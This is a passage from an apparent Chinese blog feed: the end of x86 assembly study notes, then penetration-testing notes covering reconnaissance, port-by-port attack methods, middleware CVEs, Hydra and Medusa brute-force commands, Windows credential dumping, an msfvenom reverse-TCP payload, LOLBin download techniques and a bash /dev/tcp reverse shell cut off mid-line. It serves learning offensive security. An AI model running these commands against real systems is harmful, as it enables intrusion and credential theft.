title="指令助记符"></a>指令助记符</h3><p>（1）<b>定义类型</b>：</p><ul><li><code>BYTE,WORD,DWORD</code>在前面加S表示有符号整数；<code>FWORD,QWORD,TBYTE</code>,表示48位、64位、80位整数；</li><li><code>REAL4,REAL8,REAL10</code>表示32位、64位80位实数；</li></ul><p>（2）<b>数据传送指令</b>：</p><ul><li><code>MOV,MOVZX,MOVSX</code>，mov用于相同位数传送，MOVZX全零扩展后传送，MOVSX符号扩展后传送；</li><li><code>LAHF,SAHF</code>，将EFLAGS低字节内容load到AH中，或将AH内容save到EFLAGS中；</li><li><code>XCHG</code>交换两个操作数内容；</li></ul><p>（3）<b>运算指令</b>：</p><ul><li><code>INC,DEC,ADD,SUB,ADC,SBB</code>，功能依次：+1，-1，加法，减法，带进位(CF)加法，带借位减法；</li><li><code>OFFSET,TYPE,LENGTHOF,SIZEOF,PTR，LABEL</code>，offset+标识符=标识符偏移地址、返回数据类型字节数、数组长度、数组字节数=type*lengthof、更改预设标识符类型、预分配待填充（预先时无分配地址）；</li><li><code>TYPEDEF</code>,指定数据类型（换名）；</li><li><code>MUL,IMUL(有符号)</code>，单操作数，mul后跟乘数，另一个乘数根据操作数位数决定，8位（AL）积（AX），16位（AX）积（DX：AX），32位（EAX）积（EDX：EAX），64位（RAX）积（RDX：RAX）；</li><li><code>DIV,IDIV</code>,被除数（AX、…….）默认➗除数（8、16、32、64）=商（AL、AX、EAX、DAX）+余数（AH、DX、EDX、RDX）；在做有符号除法前，需要被除数扩展符号位，<code>CBW,CWD,CDQ</code>,字节转字，字转双字，双字转四字，AL向AH扩，AX向DX扩，EAX向EDX扩；</li></ul><p>（4）<b>位操作指令</b>：</p><ul><li><code>NEG,AND,OR,XOR,NOT</code>，转补码（取相反数）、与（字符AND11011111转大写）、或（字符OR00100000转小写）、异或、非；</li><li><code>SHL(SHR),SAL,ROL,RCL</code>,逻辑左移即填0，算数左移低位填0（右移时填符号位），注意挤出来的那位需要放在EFLAGS中CF位，循环左移（带着CF），带进位循环左移（相比ROL差一位，会将CF的值加入），L改为R变成向右；</li><li><code>SHLD/SHRD</code>,双精度左移/右移，<code>SHLD des sou count</code>将des左移count位，低位插入sou高位</li></ul><p>（5）<b>堆栈操作指令</b>：</p><ul><li><code>PUSH,PUSHFD,PUSHAD,PUSHA</code>,入栈，EFLAGS入栈，按照EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI顺序放栈，pusha是pushad的16位版本；pop同理，但出栈顺序相反；</li><li><code>CALL RET</code>,将call的下一条指令压入栈，并跳转，ret则弹出并跳转；</li></ul><p>（6）<b>跳转指令</b>：</p><ul><li><code>LOOP(LOOPW),LOOPD,LOOPZ(LOOPE),LOOPNZ(LOOPNE),JMP</code>，cx!=0跳转、ecx!=0跳转、在loop基础上且ZF=1跳、在loop基础上且ZF=0跳、直接跳；</li><li><code>JC(JNC),JZ(.),JO(.),JS(.),JP(.),JE(JNE),JCXZ(JECXZ,JRAXZ)</code>，括号外是CF=1、ZF=1、OF=1、SF=1、PF=1跳，括号内则是=0跳，JE：左等于右跳，加N不等则跳，JCXZ则是=0（ECX/RCX=0）跳；</li><li><code>JA,JNA,JAE,JNAE</code>，无符号数 大于 不大于 大于等于 不大于等于 时跳转；无符号数大于（above）小于（below），有符号数大于（greater）小于（less）； </li><li><code>beginWhile......endWhile</code>,while循环</li></ul><p>（7）<b>串串操作指令</b>：</p><ul><li><code>MOVSB(W/D)</code>：将（ESI）指向的值赋给（EDI）指向的地方；</li><li><code>CMPSB(W/D)</code>：比较（ESI）与（EDI）指向的值的大小；</li><li><code>SCASB(W/D),STOSB(W/D),LODS(W/D)</code>：比较；令AL/AX/EAX投射到（EDI）的位置；装载；</li><li><code>CLD,STD</code>：设置正向（方向标记位=0）or反向；</li><li><code>REP,REP(N)Z/E</code>：ECX&gt;0时重复，增加条件ZF=1（ZF=0）；</li></ul><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><ul><li>public/private表明该模块是否可以被其他模块调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main proc (PUBLIC/PRIVATE) (传入参数...)  ;main过程开始，过程即子函数</span><br><span class="line"> ...</span><br><span class="line">main endp  ;结束main过程</span><br></pre></td></tr></table></figure><ul><li>若需要调用的模块写在main之后，需要下面的方式做个提前声明</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PROTP target_fx;提前声明，类似于C的int sum();</span><br><span class="line">EXTERN target_gx;引用当前文件之外的模块，注意被引用的需要为public</span><br><span class="line">ALIGN + 定义类型;设定对齐方式</span><br><span class="line">INVOKE 过程名 [入栈参数n...入栈参数1] ;只能在32位模式下，若参数小于32位，则会使用CBW等扩展命令</span><br><span class="line">ADDR array;ADDR只能跟在INVOKE后面做入栈参数使用，意思是取地址/传地址 </span><br></pre></td></tr></table></figure><ul><li>若需要使用过程，则注意过程帧的使用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTER;自动补齐相应的寄存器等  </span><br><span class="line">...</span><br><span class="line">LEAVE</span><br></pre></td></tr></table></figure><ul><li>结构体</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name struct/union;定义结构体，与C一样</span><br><span class="line">...</span><br><span class="line">name ENDS;还支持嵌套使用，此时内层不需要该行的name</span><br></pre></td></tr></table></figure><h4 id="宏（放在-data段，而不是-code段）"><a href="#宏（放在-data段，而不是-code段）" class="headerlink" title="宏（放在.data段，而不是.code段）"></a>宏（放在.data段，而不是.code段）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name MACRO(参数1：REQ，参数2：=&lt; &gt;，参数3)    ;定义时不检查参数类型，只有宏展开时检查,REQ表明是必须要的，:=&lt;无赋值时的初始值&gt;</span><br><span class="line">LOCAL string;LOCAL作用是，在一个宏多次展开时为避免出现多个重复的string，而使用的，将其转换为唯一标识符“??0000”、&quot;??0001&quot;等</span><br><span class="line">...</span><br><span class="line">ENDM;;该注释在宏展开时不会出现在代码中，上述注释会出现</span><br><span class="line"></span><br><span class="line">ECHO ‘xxxxxxxxxx’;输出字符串xxxxxxxxxx</span><br></pre></td></tr></table></figure><ul><li>循环宏</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WHILE(表达式):为真时执行</span><br><span class="line">REPEAT N:重复N次</span><br><span class="line">FOR A,&lt;A1,A2...&gt;:让A依次为A1,A2...</span><br><span class="line">FORC A,&lt;string&gt;:让A依次为&#x27;s&#x27;,&#x27;t&#x27;...</span><br></pre></td></tr></table></figure><ul><li>条件宏（可与LT小于，GT大于，EQ等于，NE不等于，LE小于等于，GE大于等于，搭配使用）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IFB/IFNB:空/非空，则允许汇编</span><br><span class="line">IFIDN/IFDIF a b:参数a和参数b 相等/不相等 则允许（区分大小写）</span><br><span class="line">IFIDNI/IFDIFI a b:上面类似但不区分大小写</span><br><span class="line">IFDIF/IFNDIF name:如果name已/未定义 则汇编</span><br><span class="line">IF,ENDIF,ELSE,ELSEIF:自己看</span><br><span class="line">EXITM:退出宏，且后面的宏语句都不能展开</span><br></pre></td></tr></table></figure><ul><li>特殊运算符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&amp;&#x27; : 使“CX”通过“&amp;CX”变为CX</span><br><span class="line">&#x27;&lt;&gt;&#x27; : 传递宏参数时“a，0，0”为三个参数，“&lt;a,0,0&gt;”为一个参数</span><br><span class="line">&#x27;!&#x27; : &lt;xxxx5&gt;2&gt;,第一个‘&gt;’影响判断“&lt;xxxx5!&gt;2&gt;”则将其当做字符串的一部分</span><br><span class="line">&#x27;%&#x27; : 传递宏参数时，“%(5+2)”，是可行的，会自动运算，“5+2”不可行</span><br></pre></td></tr></table></figure><h3 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h3><p>（1）<strong>8个通用寄存器</strong>（64位时前缀R，共16个通用reg）：</p><ul><li><p>EAX（常用于累加）EBX（内存寻址の基址寄存器）ECX（循环计数器）EDX（与除法乘法有关）</p></li><li><p>ESI、EDI（与bx/bp搭配使用，遍历数组）ESP（指向栈顶）EBP（指向栈底）</p><blockquote><p>EBP与ESP总是指向堆栈段最上面的栈帧，也叫活动记录，用于向子函数传递参数</p></blockquote></li></ul><p>（2）<strong>6个段寄存器</strong>（指向大致方向）：</p><ul><li><p>CS（代码段寄存器）DS（数据段寄存器，与BX搭配）SS（堆栈段寄存器，与SP、BP搭配）</p></li><li><p>附加段寄存器—ES、FS、GS</p></li></ul><p>（3）<strong>标志寄存器</strong>（EFLAGS）</p><blockquote><p>有32位，在64位模式下，由64位的RFLAGS取代，但是高32位不使用，各位用法不变</p></blockquote><ul><li>CF—无符号进位标志位、OF—有符号溢出标志位</li><li>SF—符号标志位（正=0）、ZF—零标志位（结果为0=1）</li></ul><p><img src="https://s2.loli.net/2024/08/08/Nx6bTVM4Fzoe8dj.jpg" alt="Eflags.jpg"></p><p>（4）<strong>指令指针寄存器</strong>（EIP/RIP）：指向下一条要执行的指令，与CS搭配食用</p><p>（5）<strong>特殊寄存器</strong>：8个64位のMMX寄存器 + 8个128位的XMM寄存器，被用于SIMD（单指令多数据）指令体系中，多用于高级多媒体通信或用于FPU中（用于计算浮点数，现多集成于cpu中）；</p><blockquote><p>在64位模式下=8个64位のMMX寄存器 + 16个128位的XMM寄存器 + 8个80位的浮点寄存器</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> x86 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/2023/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/"/>
      <url>/2023/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><strong>常用工具</strong>：</p><ul><li>杂烩：Metaspolit（chcp 65001解决部分乱码问题，Ruby+PostgreSQL（对象关系型数据库））、Cobalstrike—团队型MSF，有客户端和服务端部署，GUI界面、BurpSuite（外网攻击通用）；</li><li>抓包：Fiddler、WinSock Expert—抓指定进程包、Wireshark—抓包但侧重分析、charles、tcpdump；</li><li>Webshell木马与链接：behinder冰蝎、antsword蚁剑、godzilla哥斯拉；</li></ul><p><strong>常用概念及黑话</strong>：</p><ul><li>正向shell：控制端主动连接被控端</li><li>反向/反弹shell：由被控制端主动发起连接</li><li>彩虹表：属于一种字典，但是内容为hash过的东西，而字典一般存储明文</li><li>C2：command&amp;control</li><li>Poc：漏洞检测</li><li>EXP：漏洞利用，其中包含payload</li><li>Payload：指的是在目标系统中真正执行的代码</li><li>shellcode：一种payload，用于建立正向shell</li><li>Bypass：绕过</li><li>WAF：web application firewall</li><li>Webshell：以脚本语言编写的文件，能够给攻击者返回后门</li><li>0day：漏洞周期：未知漏洞—0day—补丁发布后成为1day—历史漏洞</li><li>Fuzz：模糊测试，自动化黑盒漏洞检测</li><li>APT：高级持续性威胁，相较于普通渗透周期更长，危害更大</li><li>MIMT：中间人攻击</li><li>Banner信息：欢迎语，包括软件开发商、软件名称、版本、服务类型等信息</li></ul><h3 id="做功课（打点）"><a href="#做功课（打点）" class="headerlink" title="做功课（打点）"></a>做功课（打点）</h3><p><strong>信息搜集</strong>：</p><p>后端开发框架：Java—Spring（MVC、boot、cloud、security）、Struct2、Hibernate</p><p>Python—Flask、Django、Fastapi；PHP—Laravel、ThinkPHP、CakePHP</p><p>Golang—Fiber；JS—Express.js；.Net—ASP.NET</p><p>前端开发框架：React、Vue、Angular</p><ul><li><p>Google hacking：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;balabala&quot;----------------完全匹配搜索包括顺序啥的</span><br><span class="line">a*b-----------------------即a什么b，中间有一个词未知</span><br><span class="line">&quot;a&quot;+&quot;b&quot;-------------------同时有a和b（AND）</span><br><span class="line">&quot;a&quot;|&quot;b&quot;-------------------有a或b（OR）</span><br><span class="line">&quot;a&quot;-&quot;b&quot;-------------------只有a不能包含b（NOT）</span><br><span class="line">site:bilibili.com---------指定域名</span><br><span class="line">inurl:login---------------指定网址中必须出现“login”</span><br><span class="line">intitle:后台登陆-----------指定搜索结果标题中必须有“后台登陆”</span><br><span class="line">intext:阿里巴巴------------指定搜索内容中必有“阿里巴巴”</span><br><span class="line">“三体”filetype/ext:txt----指定搜索“三体”的txt文件</span><br><span class="line">其他可在GoogleHackingDateBase（GHDB）中了解（狗头）</span><br></pre></td></tr></table></figure></li><li><p>Shodan hacking：</p><p>著名IOT（物联网）搜索引擎，网络空间搜索引擎，搜索联网设备；国内的有：zoomeye和FOFA；Google、百度、bing等都是Web搜索引擎；功能包括但不限于IP搜索、协议搜索、远程登陆等</p><p>搜索限定词：country:CN (限定服务器国家)、product:”nginx”+version:”xxxx”(搜索特定产品/服务的特定版本)、os:”Windows 7 or 8”(搜索操作系统)、net:192.168.1.1(搜索特定网段地址)、port:500(搜索特定的端口)、hostname:.edu(搜索指定主机名/域名)</p></li></ul><ul><li><p>搜索信息目标：服务器/网站/域名/管理员等。ping-windows-TTL-128、ping-Linux-TTL-64。wappanalyzer分析网站框架。CMS内容管理系统识别。敏感文件与目录【githack—.git、.svn、、目录爆破】！！。</p><blockquote><p>在网站中最下方寻找Powered by，有备案的经过一定的等保测试</p></blockquote></li><li><p>端口扫描：TCP connect扫描、TCP SYN扫描、TCP FIN扫描、TCP Xmas树扫描、TCP空扫描、TCP ACK扫描、TCP RPC扫描、UDP扫描</p></li><li><p>漏洞扫描工具：Nessus、AWVS、AppScan、X-scan等</p></li><li><p>目录端口扫描工具：<strong>Nmap</strong>、Cwebscan、御剑、dirsearch、7kbstrom、DirBuster等</p></li></ul><div class="table-container"><table><thead><tr><th>端口</th><th>协议/应用</th><th>手法</th></tr></thead><tbody><tr><td>TCP/20、21</td><td>FTP</td><td>爆破、嗅探、提权、远程代码溢出、vsftpd后门</td></tr><tr><td>TCP/22</td><td>SSH</td><td>弱口令爆破、CVE-2018-15473</td></tr><tr><td>TCP/23</td><td>Telnet</td><td>弱口令、嗅探</td></tr><tr><td>TCP/25</td><td>SMTP简单邮件传输</td><td>枚举、伪造</td></tr><tr><td>UDP/53</td><td>DNS域名解析</td><td>DNS劫持、域传送</td></tr><tr><td>67、68</td><td>DHCP</td><td>注入、污染</td></tr><tr><td>UDP/69</td><td>TFTP简单文件传输</td><td>文件下载</td></tr><tr><td>TCP/80、443</td><td>HTTP/S</td><td>web服务</td></tr><tr><td>TCP/110</td><td>POP邮局协议</td><td>弱口令、嗅探</td></tr><tr><td>TCP/137、139、445</td><td>Samba系统间文件共享</td><td>MS17-010、弱口令</td></tr><tr><td>TCP/3306</td><td>MySQL</td><td>弱口令、注入</td></tr><tr><td>TCP/3389</td><td>RDP（win远程桌面服务默认端口）</td><td>爆破、MS12_020、CVE-2019-0708</td></tr><tr><td>6379</td><td>Redis</td><td>爆破、主从复制、未授权访问</td></tr><tr><td>7001</td><td>WebLogic</td><td>弱口令、SSRF、反序列化</td></tr><tr><td>TCP/8080</td><td>Tomcat</td><td>远程代码、文件上传漏洞</td></tr><tr><td>8888</td><td>宝塔面板</td><td>弱口令爆破</td></tr></tbody></table></div><p><a href="https://cve.mitre.org/">CVE</a>：通用漏洞纰漏；<a href="[NVD - Home (nist.gov">NVD</a>](<a href="https://nvd.nist.gov/))：美国国家通用漏洞数据库；[CNVD](https://www.cnvd.org.cn/)：国家信息安全漏洞共享平台；[CNNVD](https://www.cnnvd.org.cn/)：国家信息安全漏洞库">https://nvd.nist.gov/))：美国国家通用漏洞数据库；[CNVD](https://www.cnvd.org.cn/)：国家信息安全漏洞共享平台；[CNNVD](https://www.cnnvd.org.cn/)：国家信息安全漏洞库</a></p><p><strong>中间件漏洞</strong>：</p><ul><li><p>Weblogic：Java应用服务器，JavaEE开发，默认7001端口，区别于Nginx等Web部署服务器，类似于tomcat；URL后输入console进入管理员界面，然后可以同样部署WAR包；相关漏洞扫描工具：Weblogic Scan；</p><p>控制台路径泄露（SSRF）：CVE-2014-4210；任意文件上传漏洞：CVE-2018-2894；XMLDecoder反序列化：CVE-2017-10271、CVE-2020-14859、CVE-2017-3506；Java反序列化：CVE-2016-0638、CVE-2019-2729、CVE-2019-2890</p><blockquote><p>老版本中存在弱口令：用户名密码均为：Weblogic、system、portaladmin、guest（也可交叉）；</p></blockquote></li><li><p>Struct2：JavaEE开发的MVC框架，同样web应用服务器，后缀为.do、.action使用该框架；访问/struct/webconsole.html，并使devMode=true；CVE-2017-9805</p></li><li><p>Tomcat：轻量应用服务器，默认端口8080，部分默认配置不安全，攻击者借助JDK自带的JAR.exe可以将🐎打包成WAR，在<code>Tomcat Manager</code>中上传🐎（需要有manager权限）；<code>/conf/tomcat-users.xml</code>文件中进行配置，默认使用弱口令</p><blockquote><p>tomcat中特殊使用后缀.war，用于将html、css、js等打包为压缩包</p></blockquote></li><li><p>JBoss：J2E开发应用服务器，管理EJB的容器和服务器，基于tomcat，默认端口8080；默认情况下无需输入账户信息即可登录后台<code>JMX console</code>下的<code>flavor=URL type=DeploymentScanner</code>可以输入url来进行远程WAR包下载部署</p></li><li>ThinkPHP：国产“十年磨一剑”，默认端口9000，扫描工具：TPScan；命令执行漏洞检测工具：tp5-getshell</li><li>Spring：Boot等为Spring的扩展，旨在专门领域，存在Actuators反序列化，为专门监控模块，/env下查看配置信息；扫描工具：SB-Actuator；</li><li>Fastjson：json解析器，为了把json数据格式转换为相应的对象，json bean-&gt;json为序列化，反过来就是反序列化；漏洞扫描工具：fastjson_rce_tool；</li><li>Shiro：Java的一种安全框架，可在JSE、JEE上运行，可以进行认证、授权、加密等功能；抓包后若存在<code>rememberme=deleteMe</code>（在set-cookie处）则证明使用该框架；漏洞扫描工具：Shiro-Scan</li></ul><p><strong>爆破</strong>：</p><p>主要以数据库为主，其他后台原理类似。主要爆破数据库：SQL Server的SA用户，MySQL的root用户、Oracle的System用户为主。工具：Hydra、Nmap、X-scan、CrackDB、Ncrack、BurpSuite（多用于B/S架构）</p><ol><li><p>Hydra：支持FTP、MSSQL、POP3、SSH、MYSQL等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra.exe -L c:\user.txt -P c:\passwd.txt 192.168.1.1 mysql//破解MySQL密码</span><br><span class="line">hydra.exe -L ~ -P ~ -e n -t 5 192.168.1.1 ssh</span><br></pre></td></tr></table></figure></li></ol><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-S</td><td>使用SSL链接</td></tr><tr><td>-s</td><td>采用指定端口</td></tr><tr><td>-L</td><td>指定用户名字典/小写指定用户名</td></tr><tr><td>-P</td><td>指定密码字典/小写指定密码</td></tr><tr><td>-t</td><td>指定线程数</td></tr><tr><td>-e</td><td>n：空密码试探；s：使用指定账户密码试探</td></tr><tr><td>-f</td><td>找到一个后就立马停止</td></tr></tbody></table></div><ol><li><p>Medusa：模块化设计，<code>medusa -d</code>查看可利用模块，命令参数与前者差不多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本语法：medusa 主机名 用户名 密码 -M 模块</span><br><span class="line">medusa -h 192.168.1.1 -u root -P /passwd.txt -M mysql</span><br><span class="line">medusa -h ~ -u sa -P ~ -t 5 -e ns -M mysql -O /ap.txt//成功信息记录到日志中</span><br></pre></td></tr></table></figure></li></ol><p>防治措施：使用强密码、图片、邮箱、手机验证码（一定要设置时间）、登录次数限制</p><p><strong>旁注攻击</strong>：</p><p>当目标防护措施无懈可击时，可以通过攻击在同一IP/服务器下的其他网站来获取目标机器权限，之后进行提权获得该台机器的最高权限，之后再攻击目标网站</p><ul><li>IP逆向查询：使用网络空间搜索引擎、google-hacking、查询软件ScScaner；</li><li>SQL旁注/跨库查询攻击：归因于管理员没有分配好数据库用户权限，多用于虚拟主机/NAT鸡/轻量专用服务器等。</li><li>目录越权：A用户可以操作B用户网站所在目录。</li><li>CDN查询真实IP：phpinfo()、对子域名进行查询、DNSlog来多地ping</li></ul><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><ol><li>服务器支持的脚本语言</li><li>服务器端口探测</li><li>路径信息</li></ol><h4 id="Windows内网信息搜集："><a href="#Windows内网信息搜集：" class="headerlink" title="Windows内网信息搜集："></a>Windows内网信息搜集：</h4><p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p><blockquote><p>工作组中各个用户可以相互访问，组间也可以相互访问，只是名义上的普通分组。在win中专属的域机制，域之间不可直接访问，实行中心化管理机制“DC”即域控，每一个想要进入该域的机器通过Kerberos协议先访问DC，DC中存储域内用户相关信息“AD”即活动目录，经过SAM来进行NTLM验证对比，有账号管理、软件环境集中管理等。一个域中至少两个DC+AD，域间DNS查询位置</p></blockquote><p>cmd中<code>systeminfo</code>查看机器有关信息；密码存储位置：注册表/文件；<code>$I</code>开头的表示文件保存路径，<code>$R</code>开头表示内容；<code>netsh</code>后<code>wlan show profile</code>查看连接过的wifi配置；杀软一般不对内存进行查杀，使用ps脚本（downloadstring）远程下载或webdelivery绕过查杀，；minikatz获取cookie；</p><p>在win server中使用<code>`net</code>命令查看域；端口识别389（LDMP、ILS、目录访问）53（DNS）；</p><p>协议-工具：netbios-nbtscan；UDP-unicornscan；ICMP（ping命令，ip层）；ARP-arpscan；</p><p>win下的密码凭证获取：密码格式=名称:ID:LM-hash:NTLM-hash:::（在win03server后LM部分不用）；认证过程（本地、网络、域）</p><p>本地：pwd与\system32\config\sam中对比，打开时会显示被另一个程序使用PID=4的system，早期版本一直会被lasaa.exe进程使用（win11目前还有），如果一直在内存中，可能拿到明文密码；</p><p>域内：需要windows\NTDS下的ntds.dit文件 + sam文件 (同上)+ system32\config\system.hive文件；使用卷影（Volume Shadow Copy）服务查看已被使用文件，在Server系统上有默认的<code>ntdsutil</code>命令进行挂载，其他工具Vssadmin、Vshadow（MS SDK中有，VStudio）、NinjaCopy；</p><p>密码抓取工具：先用<code>esentutil</code>对ntds.dit文件进行修复，再QuarksPwDump、NtdsAudit、minikatz、PowerSpolit（工具集）拉取密码，再网站或彩虹表解密；</p><p>彩虹表-ophcrack；官方扩展工具包procdump+minikatz配合食用；注册表reg save；laZagne自助脚本获取密码；MySQL中<code>.frm .myd .myi</code>分别表示表结构、数据（winhex打开）、索引树（cmd5网站破解）；常用密码破解软件john、Hydra、Hashcat、Medusa；SharpDecryptPwd.exe破解常用软件密码；</p><h4 id="Linux下信息搜集"><a href="#Linux下信息搜集" class="headerlink" title="Linux下信息搜集"></a>Linux下信息搜集</h4><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp</code>生成小马，上传之后之后chmod，执行得到meterpreter，以<code>./xxx&amp;</code>表示在后台运行；或者shell中<code>python -c &quot;import pty;pty.spwan(&#39;/bin/bash&#39;)&quot;</code>以shell交互执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uname -a //获取系统信息</span><br><span class="line">ps -elf //列出全部进程（快照），在/proc下有所有进程信息</span><br><span class="line">top //实时任务管理，root的uid=0，普通用户的uid&gt;1000</span><br><span class="line">last //最近登陆状态</span><br><span class="line">lastb //最近失败登录，减少爆破用强密码或者更换ssh端口</span><br><span class="line">service --status -all //查看服务器状态</span><br><span class="line">iptables //防火墙</span><br><span class="line">netstat // 网络状态</span><br></pre></td></tr></table></figure><p>重要文件目录：</p><p>/etc/issue登陆提示前的消息；/etc/lsb-release或/redhat-release或/os-release中系统版本信息；/etc/crontab计划任务；</p><p>/proc/version存放Linux内核版本+gcc版本；/proc/sys/kernel/version监视内核构建时间；</p><p>/var/log日志；/etc/passwd用户+组+id+用户目录；/etc/shadow存放用户和hash过的密码；</p><p>.ssh文件下/id_rsa存放RSA私钥、/authorized、/id_rsa.pub存放公钥；</p><hr><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>在win中</p><ul><li>ftp命令，从攻击机/服务器上下载脚本，anonymous进行匿名化；</li><li><p>Bitsadmin自带工具，在PS中有wget、curl、iwr等网络下载工具；</p></li><li><p>Certutil还可管理证书<code>C:\Users\Lenovo\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>中有缓存，Scp：用户@IP；</p></li><li>rundll32.exe用于运行下载的dll；</li><li>PS脚本：IEX函数将字符串当命令执行，-enc接受base64过的命令</li></ul><blockquote><p>HTA = html app</p></blockquote><p>Linux：wget、curl、netcat、sftp</p><p>脚本：php、py2、py3、perl、javascript、VBscript、ruby、Lua、Bash、R、Powershell、Jscript</p><blockquote><p>B语言后来借MS发展为VB，VBS大多在网页中用，VBA作为宏语言在应用中嵌入使用</p></blockquote><hr><h3 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h3><p>反弹shell原因是，方便进行命令输入，且能够看到回显，而且是交互式的；有在线网站生成</p><h4 id="win下反弹shell"><a href="#win下反弹shell" class="headerlink" title="win下反弹shell"></a>win下反弹shell</h4><ol><li><p>由被控制端将cmd进行重定向到网络中控制端的某一正在监听的端口（反向）；被控端重定向cmd到本地的一个端口，由控制端主动连接</p></li><li><p>Mshta.exe：可以解释并执行.hta（可借此利用js、vbs），payload可由MSF生成</p></li><li><p>Rundll32.exe：可以在内存中加载运行.dll文件，payload由MSF生成</p><blockquote><p>区别于rundl132.exe，为蠕虫变种病毒</p></blockquote></li><li><p>Regsvr32.exe：用于注册/注销OLE控件，存在于System32文件夹中</p></li><li><p>Curtutil.exe、powershell（代码混淆Invoke-Obfuscation）</p></li><li><p>msiexe.exe：win上的专门安装文件.msi，MSF可以生成payload</p></li></ol><h4 id="Linux下反弹shell"><a href="#Linux下反弹shell" class="headerlink" title="Linux下反弹shell"></a>Linux下反弹shell</h4><p>标准文件描述符：</p><ul><li>0-stdin-将键盘当作输入</li><li>1-stdout-将显示器作为默认输出</li><li>2-stderr-将报错输出默认输出到显示器</li></ul><p>更改标准输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;<span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hello world&#x27;</span>1&gt;<span class="built_in">test</span>//追加的话需要换成“&gt;&gt;”</span><br></pre></td></tr></table></figure><p>更改标准输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> user 键盘输入+回车;<span class="built_in">echo</span> <span class="variable">$user</span>//将键盘输入作为user变量的值</span><br><span class="line"><span class="built_in">read</span> user 0&lt; <span class="built_in">test</span>;<span class="built_in">echo</span> <span class="variable">$user</span>//将<span class="built_in">test</span>文件中的内容赋给user变量</span><br><span class="line"><span class="built_in">exec</span> 2&gt;<span class="built_in">test</span>//将所有的错误显示到<span class="built_in">test</span>文件中.....................</span><br></pre></td></tr></table></figure><p>自定义描述符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&gt;<span class="built_in">test</span>; <span class="built_in">echo</span><span class="string">&#x27;hello&#x27;</span> 1&gt;&amp;5//在<span class="built_in">test</span>文件中存放‘hello’，&amp;引用文件描述符</span><br></pre></td></tr></table></figure><p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见<a href="[Online - Reverse Shell Generator (revshells.com">反弹shell</a>](<a href="https://www.revshells.com/">https://www.revshells.com/</a>))</p><p>被控端<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 